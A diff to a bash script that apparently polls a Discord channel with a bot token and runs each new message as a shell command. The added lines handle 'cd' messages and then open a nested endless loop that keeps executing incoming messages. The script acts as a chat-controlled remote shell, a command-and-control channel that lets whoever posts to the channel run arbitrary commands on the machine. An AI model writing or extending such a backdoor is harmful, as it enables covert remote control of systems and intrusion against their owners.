@@ -188,6 +188,18 @@ curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" 
 while true; do
     recent_message=$(get_recent_message)
     if [[ ! -z $recent_message && $recent_message != $(cat $last_command_file 2>/dev/null) ]]; then
+        if [[ "$recent_message" =~ ^cd\  ]]; then
+            cd_command=$(echo "$recent_message" | awk '{print $2}')
+            cd "$cd_command"
+            while true; do
+                recent_message=$(get_recent_message)
+                if [[ ! -z $recent_message && $recent_message != $(cat $last_command_file 2>/dev/null) ]]; then
+                    execute_command "$recent_message"
+                    echo "$recent_message" > $last_command_file
+                fi
+                sleep 5
+            done
+        fi
         execute_command "$recent_message"
         echo "$recent_message" > $last_command_file
     fi
